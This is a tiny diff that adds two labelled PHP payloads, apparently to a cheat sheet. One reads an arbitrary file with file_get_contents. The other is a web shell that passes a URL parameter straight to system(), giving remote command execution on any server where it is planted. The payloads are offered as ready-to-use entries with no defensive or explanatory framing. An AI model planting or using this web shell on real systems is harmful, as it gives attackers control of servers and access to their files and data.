@@ -1,1 +1,5 @@
+Read file content : <?php echo file_get_contents('/path/to/file'); ?>
+
+Web shell : <?php echo system($_GET['command']); ?>
+
 
